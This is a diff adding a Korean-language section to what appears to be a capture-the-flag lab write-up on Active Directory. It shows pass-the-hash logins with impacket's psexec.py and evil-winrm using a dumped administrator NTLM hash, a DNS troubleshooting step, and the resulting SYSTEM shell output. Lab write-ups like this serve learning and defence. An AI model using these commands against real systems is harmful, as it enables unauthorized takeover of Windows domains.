@@ -656,3 +656,52 @@ ATTACKTIVEDIREC$:aes128-cts-hmac-sha1-96:eaf67abcb1a5b9007b5f04cac2365555
 ATTACKTIVEDIREC$:des-cbc-md5:9426b6febf6dc2ab
 [*] Cleaning up...
 ```
+
+# 얻은 해시 정보로 바로 로그인
+
+## 1. psexec.py (impacket)
+
+- SMB/NTLM 해시로 윈도우 명령 프롬프트 쉘 획득
+- 관리자 해시 필요
+
+```bash
+# administrator 계정으로 바로 로그인 시도
+python3 /impacket/examples/psexec.py spookysec.local/administrator -hashes aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc -dc-ip 10.10.53.245
+
+# evil-winrm 사용해서 하는 방법
+evil-winrm -i 10.10.53.245 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc
+```
+
+```
+[Errno Connection error (spookysec.local/administrator:445)] [Errno -2] Name or service not known
+```
+
+## 원인
+
+- spookysec.local 도메인 이름을 IP로 변환 못함 (DNS 문제)
+- /etc/hosts에 도메인-IP 매핑이 없거나 오타
+
+```bash
+# 그냥 도메인 없이 ip로
+python3 /impacket/examples/psexec.py administrator@10.10.53.245 -hashes aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc
+```
+
+┌──(test)(root㉿docker-desktop)-[/impacket]
+└─# python3 /impacket/examples/psexec.py administrator@10.10.53.245 -hashes aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc
+/impacket/test/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
+import pkg_resources
+Impacket v0.13.0.dev0+20250707.152659.a60a1f17 - Copyright Fortra, LLC and its affiliated companies
+
+[*] Requesting shares on 10.10.53.245.....
+[*] Found writable share ADMIN$
+[*] Uploading file alNSfNJr.exe
+[*] Opening SVCManager on 10.10.53.245.....
+[*] Creating service qVuD on 10.10.53.245.....
+[*] Starting service qVuD.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.17763.1490]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>
+
+# 시스템 탈환 성공
